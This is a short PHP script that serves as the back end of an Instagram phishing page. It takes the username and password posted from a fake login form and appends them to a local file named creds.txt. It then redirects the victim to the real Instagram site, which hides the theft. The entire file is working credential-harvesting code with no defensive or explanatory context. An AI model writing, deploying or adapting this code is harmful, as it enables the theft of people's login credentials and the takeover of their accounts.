<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $username = $_POST["username"];
    $password = $_POST["password"];

    // Save credentials
    file_put_contents("creds.txt", "$username:$password\n", FILE_APPEND);

    // Redirect to real Instagram
    header("Location: https://www.instagram.com");
    exit();
}
?>
